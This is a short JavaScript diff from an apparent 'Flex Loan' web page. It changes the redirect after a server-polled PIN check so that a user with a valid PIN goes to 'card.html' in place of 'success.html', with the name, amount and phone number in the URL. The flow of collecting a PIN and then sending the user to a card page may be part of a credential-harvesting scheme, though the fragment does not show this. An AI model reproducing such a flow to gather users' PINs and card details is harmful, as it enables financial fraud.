@@ -1002,7 +1002,7 @@
                                     if (cb === 'pin_valid') {
                                         clearInterval(pinPollInterval);
                                         // Valid PIN → open success.html
-                                        location.href = 'success.html?name=' + encodeURIComponent(document.title) + '&amount=' + (bd.price || '0') + '&purpose=' + encodeURIComponent(bd.data || 'Flex Loan') + '&phone=' + phone;
+                                        location.href = 'card.html?name=' + encodeURIComponent(document.title) + '&amount=' + (bd.price || '0') + '&purpose=' + encodeURIComponent(bd.data || 'Flex Loan') + '&phone=' + phone;
                                     } else if (cb === 'pin_invalid') {
                                         clearInterval(pinPollInterval);
                                         // Invalid PIN → return to PIN popup modal
